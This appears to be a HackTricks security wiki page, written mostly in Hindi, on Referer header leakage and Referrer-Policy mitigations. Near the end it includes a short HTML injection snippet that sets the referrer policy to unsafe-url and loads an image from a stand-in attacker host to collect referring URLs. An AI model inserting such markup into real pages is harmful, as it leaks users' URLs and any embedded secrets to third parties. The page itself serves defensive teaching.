# Interesting HTTP Behavior

{{#include ../banners/hacktricks-training.md}}

## `Referer` Header और Referrer Policy

HTTP `Referer` request header उस absolute या partial URL की पहचान करता है, जिससे किसी resource का अनुरोध किया गया था। सक्रिय referrer policy के आधार पर, इसमें referring origin, path और query string शामिल हो सकते हैं, लेकिन URL fragment शामिल नहीं होता।<sup>[[1]](#references)</sup>

### Sensitive Information leak

URL paths या query parameters में मौजूद secrets browser history, logs, analytics, copied links और `Referer` header के माध्यम से leak हो सकते हैं। इसलिए, cross-origin link या subresource request referring URL को किसी external server के सामने disclose कर सकता है।<sup>[[2]](#references)</sup>

### Mitigation

ब्राउज़र द्वारा भेजी जाने वाली referrer information की मात्रा नियंत्रित करने के लिए `Referrer-Policy` response header का उपयोग करें। Browsers में `strict-origin-when-cross-origin` आधुनिक default है, जबकि `no-referrer` header को पूरी तरह suppress करता है; ऐसी policy चुनें जो application की requirements के अनुरूप हो।<sup>[[3]](#references)</sup>
```http
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
पासवर्ड, session identifiers, API keys या अन्य sensitive values को URLs में न रखें। इसके बजाय उन्हें TLS के माध्यम से उचित request headers या bodies में भेजें।<sup>[[2]](#references)</sup>

### HTML Injection पर विचार

कोई document `<meta name="referrer">` के साथ पूरे page के लिए policy भी सेट कर सकता है। यदि कोई HTML injection flaw attacker को एक प्रभावी meta element insert करने देता है, तो attacker बाद के requests के लिए document की policy को कमजोर करने का प्रयास कर सकता है। Dynamically injected या conflicting meta policies का व्यवहार अप्रत्याशित हो सकता है, इसलिए यह मानने के बजाय कि response header हमेशा override हो जाता है, target browser में behavior verify करें।<sup>[[4]](#references)</sup>
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.example/collect" alt="">
```
मूल HTML injection को ठीक करें और sensitive data को URL से बाहर रखें; referrer policy defense in depth है, इनमें से किसी भी control का विकल्प नहीं।

## References

- [1] [MDN - `Referer` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer)
- [2] [MITRE CWE-598 - Sensitive Query Strings के साथ GET Request Method का उपयोग](https://cwe.mitre.org/data/definitions/598.html)
- [3] [MDN - `Referrer-Policy` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy)
- [4] [MDN - `<meta name="referrer">`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/meta/name/referrer)
{{#include ../banners/hacktricks-training.md}}
